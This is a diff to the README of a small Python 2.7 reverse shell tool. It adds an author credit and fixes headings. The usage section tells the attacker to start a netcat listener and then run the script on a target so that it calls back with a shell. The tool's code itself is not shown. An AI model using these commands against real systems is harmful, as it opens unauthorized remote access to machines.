@@ -1,12 +1,13 @@
 # reverse shell friendly
 simple tool to reverse shell using python for Linux & Windows
+by :mathio.dz
 
 ## Prerequisites
 
-This script requires Python 2.7
+Python 2.7
 
-##Usage
-### atacker
+###Usage:
+### Attacker
 
 ```
 mathio@dz nc-vlp port
@@ -16,3 +17,4 @@ mathio@dz nc-vlp port
 ```
 python2 reverse_shell.py server port linux/windows
 ```
+
